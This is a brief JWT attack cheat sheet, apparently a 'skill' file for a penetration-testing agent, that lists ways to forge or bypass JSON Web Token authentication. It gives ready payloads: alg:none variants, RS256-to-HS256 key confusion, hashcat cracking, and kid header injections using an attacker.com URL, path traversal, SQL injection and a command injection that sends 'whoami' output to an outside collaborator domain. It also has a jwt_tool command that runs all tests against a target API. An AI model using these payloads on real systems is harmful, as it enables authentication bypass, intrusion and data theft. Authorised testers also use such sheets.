# SKILL: jwt
## Vectors
1. Sig not checked → modify payload
2. Sig only if present → delete sig
3. Weak sig → hashcat 16500
4. alg: none/None/NONE/nONE
5. Public key → change to HS256, sign with pubkey
6. Vulnerable kid:
   - kid: "http://attacker.com/key.pem"
   - kid: "../../public/main.css"
   - kid: "1 UNION SELECT 'key'--"
   - kid: "app/key.pem;ping `whoami`.collab.net"
7. jku/x5u → attacker JWK set
## Automation
python3 jwt_tool.py -M at -t "https://api.x/user/1" -rh "Authorization: Bearer <JWT>"
## Triage
Sig bypass → Critical. alg confusion → Critical. kid injection → High/Critical.
